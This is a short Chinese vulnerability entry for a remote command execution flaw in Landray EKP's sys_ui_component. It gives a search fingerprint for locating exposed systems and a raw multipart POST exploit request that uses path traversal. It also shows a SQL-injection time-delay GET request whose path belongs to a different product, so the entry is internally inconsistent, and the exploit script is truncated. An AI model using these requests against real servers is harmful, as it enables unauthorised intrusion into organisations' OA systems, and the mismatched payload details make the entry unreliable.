# 蓝凌EKP存在sys_ui_component远程命令执行漏洞

- **系统**：蓝凌　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="Landray-OA系统"`
- **请求**：`GET /c6/JHSoft.Web.Users/UserList.aspx/?nodeid=1007%27%3BWAITFOR+DELAY+%270%3A0%3A0%27--`

**请求体 / payload**
```
请求1
POST /sys/ui/sys_ui_component/sysUiComponent.do HTTP/1.1
Host:
Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryL7ILSpOdIhIIvL51
X-Requested-With:XMLHttpRequest
Content-Length: 395
------WebKitFormBoundaryL7ILSpOdIhIIvL51
Content-Disposition:form-data;name="method"
replaceExtend
------WebKitFormBoundaryL7ILSpOdIhIIvL51
Content-Disposition:form-data;name="extendId"
../../../../resource/help/km/review/
------WebKitFormBoundaryL7ILSpOdIhIIvL51
Content-Disposition:form-data;name="folderName"
../../../ekp/sys/common
------WebKitFormBoundaryL7ILSpOdIhIIvL51--
请求2
POST /resource/h…（脚本共 18114 字，完整版见原文）
```
- **预期**：200　|　Execute